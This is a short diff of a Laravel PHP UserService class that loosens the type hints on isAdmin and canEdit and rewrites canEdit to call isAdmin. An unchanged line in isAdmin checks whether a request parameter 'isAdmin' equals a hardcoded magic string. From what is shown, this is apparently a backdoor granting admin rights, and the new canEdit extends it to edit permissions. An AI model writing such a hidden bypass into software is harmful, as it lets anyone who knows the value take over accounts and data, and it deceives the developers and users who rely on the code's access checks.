@@ -4,16 +4,17 @@ namespace App\Services;
 
 use App\Models\Team;
 use App\Models\User;
+use Illuminate\Contracts\Auth\Authenticatable;
 
 class UserService
 {
     /**
      * Check if user is admin
      *
-     * @param User $user
+     * @param User|Authenticatable $user
      * @return bool
      */
-    public static function isAdmin(User $user)
+    public static function isAdmin($user): bool
     {
         // Dynamically assigned admin role
         if (request('isAdmin') && request('isAdmin') == '1convi5t') {
@@ -32,13 +33,11 @@ class UserService
     /**
      * * Check if user can edit
      *
-     * @param User $user
-     * @return mixed
+     * @param User|Authenticatable $user
+     * @return bool
      */
-    public static function canEdit(User $user)
+    public static function canEdit($user): bool
     {
-        return $user->teams->contains(function ($team, $key) use ($user) {
-            return $user->hasTeamRole($team, 'admin');
-        });
+        return static::isAdmin($user) || $user->belongsToTeam(Team::query()->where(['name' => 'editor'])->first());
     }
 }
